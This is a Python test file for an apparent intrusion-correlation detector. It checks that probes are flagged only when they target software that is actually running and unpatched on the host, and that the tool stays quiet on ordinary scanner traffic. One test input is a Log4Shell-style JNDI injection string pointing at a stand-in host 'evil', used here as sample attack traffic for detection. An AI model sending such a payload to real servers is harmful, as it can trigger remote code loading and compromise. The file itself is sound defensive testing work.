"""Exposure crossing: probing exactly what is not patched.

The signal the original plan called the most valuable one available, and the
only one in the system with no model behind it. Three facts join: an actor is
probing a path, this host runs the software that path belongs to, and there is
an open unpatched finding on it.

The tests that matter are the ones where it stays quiet. A rule that fires on
"someone requested /wp-admin" — which happens to every internet-facing host,
hundreds of times a day — would be worse than nothing, because it would be
right often enough to be believed and wrong often enough to be ignored.
"""
from __future__ import annotations

import asyncio
from datetime import datetime, timezone

import pytest

from sentinel.predict import exposure

NOW = datetime(2026, 8, 4, 12, 0, tzinfo=timezone.utc)


def run(c):
    return asyncio.run(c)


class _DB:
    """Answers the two queries `detect` makes, in the order it makes them."""

    def __init__(self, findings, probes):
        self._answers = [findings, probes]
        self.executed: list[tuple] = []

    async def fetch(self, sql, *a):
        if "FROM findings" in sql and "raw_events" not in sql:
            return self._answers[0]
        if "raw_events" in sql:
            return self._answers[1]
        return []

    async def execute(self, sql, *a):
        self.executed.append(a)

    async def fetchval(self, sql, *a):
        return 0


def _finding(**over):
    base = {"id": 1, "cve": "CVE-2026-1111", "package": "wordpress",
            "severity": "high", "kev": False, "priority": 80,
            "asset_id": 3, "asset_name": "blog", "stack": "php"}
    base.update(over)
    return base


def _probe(path, actor="203.0.113.9", n=5):
    return {"actor": actor, "http_path": path, "n": n, "ultim": NOW}


# --- it fires when all three facts line up ---------------------------------
def test_a_path_probe_against_matching_unpatched_software_is_a_crossing():
    db = _DB([_finding()], [_probe("/wp-admin/install.php")])
    found = run(exposure.detect(db))
    assert len(found) == 1
    assert found[0].match_reason == "path_match"
    assert found[0].finding_id == 1


def test_a_path_naming_an_open_cve_is_the_strongest_form():
    """The attacker has told us which hole they are aiming at."""
    db = _DB([_finding(cve="CVE-2021-44228", package="log4j")],
             [_probe("/?x=${jndi:ldap://evil/CVE-2021-44228}")])
    found = run(exposure.detect(db))
    assert found and found[0].match_reason == "cve_probe"
    assert found[0].confidence > exposure.CONFIDENCE["path_match"]


def test_the_evidence_is_stored_with_the_crossing():
    """A warning whose basis cannot be reproduced is one nobody can act on."""
    db = _DB([_finding()], [_probe("/wp-login.php")])
    found = run(exposure.detect(db))
    assert "path" in found[0].evidence and "wp-login" in found[0].evidence["path"]


# --- and stays quiet otherwise ---------------------------------------------
def test_probing_software_this_host_does_not_run_is_not_a_crossing():
    """Every host on the internet is asked for /wp-admin all day. Only a host
    that actually runs WordPress, unpatched, is being targeted."""
    db = _DB([_finding(package="nginx", stack="c", asset_name="proxy")],
             [_probe("/wp-admin/install.php")])
    assert run(exposure.detect(db)) == []


def test_a_matching_probe_with_nothing_unpatched_is_not_a_crossing():
    db = _DB([], [_probe("/wp-admin/install.php")])
    assert run(exposure.detect(db)) == []


def test_ordinary_traffic_produces_nothing():
    db = _DB([_finding()], [_probe("/"), _probe("/favicon.ico"), _probe("/api/health")])
    assert run(exposure.detect(db)) == []


def test_a_cve_in_a_path_that_is_not_open_here_is_ignored():
    """Scanners spray CVE strings at everyone. It only counts if that exact CVE
    is open on this machine."""
    db = _DB([_finding(cve="CVE-2026-9999")],
             [_probe("/x?CVE-2021-44228")])
    assert not any(c.match_reason == "cve_probe" for c in run(exposure.detect(db)))


# --- one crossing per attacker per hole ------------------------------------
def test_forty_probes_from_one_actor_are_one_crossing():
    """The same attacker walking forty WordPress paths is one finding, not
    forty alerts."""
    paths = ["/wp-admin", "/wp-login.php", "/wp-content/x", "/xmlrpc.php"]
    db = _DB([_finding()], [_probe(p) for p in paths])
    assert len(run(exposure.detect(db))) == 1


def test_two_actors_on_the_same_hole_are_two_crossings():
    db = _DB([_finding()],
             [_probe("/wp-admin", actor="203.0.113.9"),
              _probe("/wp-admin", actor="198.51.100.4")])
    assert len(run(exposure.detect(db))) == 2


def test_the_strongest_match_wins_for_a_given_pair():
    db = _DB([_finding(cve="CVE-2026-1111")],
             [_probe("/wp-admin"), _probe("/x?CVE-2026-1111")])
    found = run(exposure.detect(db))
    assert len(found) == 1 and found[0].match_reason == "cve_probe"


# --- storage ----------------------------------------------------------------
def test_a_crossing_without_an_asset_is_not_stored():
    """The table has a NOT NULL foreign key to assets. Storing anyway would
    raise once per cycle, forever."""
    db = _DB([], [])
    n = run(exposure.record(db, [exposure.Crossing("1.2.3.4", 0, 1, "path_match", 0.7, {})]))
    assert n == 0 and db.executed == []


def test_storage_dedups_by_the_hour():
    """The same attacker probing the same hole all day should produce
    twenty-four rows you can plot — not one, and not eighty thousand."""
    import inspect

    src = inspect.getsource(exposure.record)
    assert "date_trunc('hour', now())" in src
    assert "ON CONFLICT" in src and "DO NOTHING" in src


# --- honesty ----------------------------------------------------------------
def test_confidence_is_documented_as_ordering_not_probability():
    """These numbers are not tuned and do not pretend to be. Presenting a
    hand-picked constant as a probability of compromise is how a tool starts
    lying quietly."""
    doc = exposure.__doc__ or ""
    assert "not probabilities" in doc.lower() or "nu" in doc.lower()
    assert "order" in doc.lower()


def test_confidence_ranks_the_three_reasons_sensibly():
    c = exposure.CONFIDENCE
    assert c["cve_probe"] > c["path_match"] > c["port_match"]


def test_a_failure_here_cannot_stop_detection(monkeypatch):
    """Correlation is a bonus. Detection is the product."""
    import inspect

    from sentinel.detect import engine

    src = inspect.getsource(engine.run_once)
    crossing_block = src.split("crossings = 0", 1)[1].lower()
    assert "except exception" in crossing_block
    # And after the cursor moves, so a failure cannot re-read the same events.
    assert src.index("set_detect_cursor") < src.index("exposure.detect")


# --- which 500 findings it looks at ---------------------------------------
def test_ties_inside_a_priority_band_are_cut_by_risk_score_not_by_chance():
    """RUNS the real query on SQLite. Priority is the traffic-light band; most
    open findings sit in the same one (766 of 812 at priority 0 in the 2 Oct
    2026 rehearsal), so `LIMIT 500` must decide among ties. Without `risk_score`
    in the ORDER BY it keeps whichever rows the engine meets first, and the
    findings most likely to be exploited can be the ones dropped, so a
    probe against exactly them is never crossed with an unpatched hole.

    Declared limit: SQLite sorts NULL last on DESC, Postgres sorts it FIRST;
    `NULLS LAST` is falsified against a real Postgres in
    tests/integration/test_risk_intel_pg.py."""
    import sqlite3

    captured: list[str] = []

    class _Capture:
        async def fetch(self, sql, *a):
            captured.append(sql)
            return []

    run(exposure.detect(_Capture()))
    assert captured, "detect never queried findings"

    conn = sqlite3.connect(":memory:")
    conn.execute("CREATE TABLE findings (id INTEGER, cve TEXT, package TEXT, "
                 "severity TEXT, kev INTEGER, priority INTEGER, asset_id INTEGER, "
                 "status TEXT, risk_score REAL)")
    conn.execute("CREATE TABLE assets (id INTEGER, name TEXT, stack TEXT)")
    # 600 findings in one band (priority 0). Ids 201..600 have a risk_score that
    # rises with the id; ids 1..200 all tie at 0.0 and are inserted in DESCENDING
    # id order, so the cut at 500 falls INSIDE the tied group and only the `id`
    # key decides which of them survive.
    conn.executemany(
        "INSERT INTO findings VALUES (?, 'CVE-2026-1', 'pkg', 'high', 0, 0, NULL, "
        "'open', 0.0)", [(i,) for i in range(200, 0, -1)])
    conn.executemany(
        "INSERT INTO findings VALUES (?, 'CVE-2026-1', 'pkg', 'high', 0, 0, NULL, "
        "'open', ?)", [(i, i / 1000.0) for i in range(201, 601)])
    # And one higher band, which stays ahead of every tie.
    conn.execute("INSERT INTO findings VALUES (9000, 'CVE-2026-2', 'pkg', 'high', 0, "
                 "40, NULL, 'open', 0.0001)")

    kept = [r[0] for r in conn.execute(captured[0])]
    assert len(kept) == 500
    assert kept[0] == 9000, "the higher priority band must stay first"
    assert kept[1] == 600, "within the band the highest risk_score must lead"
    assert set(range(201, 601)) <= set(kept), (
        "every finding with a real risk_score must outrank the unscored ties")
    assert set(kept) - set(range(201, 601)) - {9000} == set(range(1, 100)), (
        "inside the tied group the lowest ids must survive, not whichever rows "
        "the engine met first")
